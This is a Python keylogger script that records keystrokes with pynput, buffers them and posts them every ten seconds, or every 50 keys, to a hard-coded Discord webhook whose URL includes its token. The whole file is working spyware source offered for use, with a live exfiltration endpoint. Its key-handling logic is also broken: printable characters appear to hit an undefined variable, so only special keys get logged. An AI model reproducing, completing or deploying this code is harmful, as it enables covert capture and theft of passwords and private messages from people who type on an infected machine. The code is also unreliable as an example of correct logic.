import requests
from pynput import keyboard
import threading
import time

WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1285284225011945472/SX1X6-7wLEme6JdTr31kAs4tYjF_gCRSpxTb1DTXZR4xh0o1U6KvsZTy1aGp1STXhaQk'

key_buffer = []
BUFFER_SIZE = 50
lock = threading.Lock()

def send_to_discord(message):
    try:
        data = {
            'content': message
        }
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code != 204:
            print(f"Failed to send message to Discord. Status code: {response.status_code}")
    except Exception as e:
        print("ERROR: Could not send message to Discord:", e)

def process_buffer():
    while True:
        time.sleep(10)
        with lock:
            if key_buffer:
                message = ''.join(key_buffer)
                key_buffer.clear()
                send_to_discord(message)

def on_press(key):
    global key_buffer
    try:
        char = getattr(key, 'char', None)
        if char is not None:
            key_entry = f'{char}'
        else:
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.backspace: ' [BACKSPACE]',
                keyboard.Key.enter: ' [ENTER]',
                keyboard.Key.shift: ' [SHIFT]',
                keyboard.Key.shift_l: ' [SHIFT]',
                keyboard.Key.shift_r: ' [SHIFT]',
                keyboard.Key.tab: ' [TAB]',
                keyboard.Key.ctrl: ' [CTRL]',
                keyboard.Key.ctrl_l: ' [CTRL]',
                keyboard.Key.ctrl_r: ' [CTRL]',
                keyboard.Key.alt: ' [ALT]',
                keyboard.Key.alt_l: ' [ALT]',
                keyboard.Key.alt_r: ' [ALT]',
                keyboard.Key.alt_gr: ' [ALT]',
                keyboard.Key.caps_lock: ' [CAPS-LOCK]',
                keyboard.Key.num_lock: ' [NUM-LOCK]',
                keyboard.Key.esc: ' [ESC]',
                keyboard.Key.delete: ' [DELETE]',
                keyboard.Key.page_up: ' [PAGE-UP]',
                keyboard.Key.page_down: ' [PAGE-DOWN]',
                keyboard.Key.insert: ' [INSERT]',
                keyboard.Key.print_screen: ' [PRINT-SCREEN]',
            }
            special_key = special_keys.get(key)
        if special_key:
                key_entry = f'{special_key}'
        else:
            return
        
        with lock:
            key_buffer.append(key_entry)
            if len(key_buffer) >= BUFFER_SIZE:
                message = ''.join(key_buffer)
                key_buffer.clear()
                send_to_discord(message)
    
    except Exception as e:
        print("ERROR: Could not process key:", e)

def start_keylogger():
    buffer_thread = threading.Thread(target=process_buffer, daemon=True)
    buffer_thread.start()
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
